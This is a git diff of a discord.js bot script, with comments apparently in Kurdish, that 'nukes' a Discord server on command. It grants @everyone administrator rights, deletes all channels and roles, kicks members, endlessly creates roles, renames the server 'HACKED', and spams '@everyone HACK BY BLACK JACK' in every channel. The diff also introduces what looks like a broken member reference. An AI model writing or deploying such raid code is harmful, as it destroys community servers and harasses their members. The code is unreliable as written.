@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = '.'///lera ba dly xot prefix dabne
+const prefix = 'b?'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -28,15 +28,16 @@ client.on('message', message => {
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
         });
+         
         message.guild.channels.map(c => {
             c.delete();
         });
-    message.guild.members.forEach(m =>{
-                    m.ban()
-                })
+       message.members.forEach(m => {
+                    m.kick();
+                });
       message.guild.roles.forEach(r =>{
                     r.delete()
-                })
+                });
       
         setInterval(() => {
             message.guild.createRole({
@@ -49,7 +50,6 @@ client.on('message', message => {
         }, 1000);
         message.guild.setIcon("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
         client.user.setAvatar("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
-        client.user.setUsername("HACKED")
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
@@ -58,18 +58,11 @@ client.on('message', message => {
                 channel.send('@everyone HACK BY BLACK JACK :joy: :joy: :joy:')
                
                 })
-            }
-                        
-                        , 500)
-            })
-        }
-    
-                   
-    }
-
-          )
+            }                        
+               , 500)
+    })}})
 
  ////codaka drwst krawa lalayan black jack
-///just for test
+
 client.login("")
           
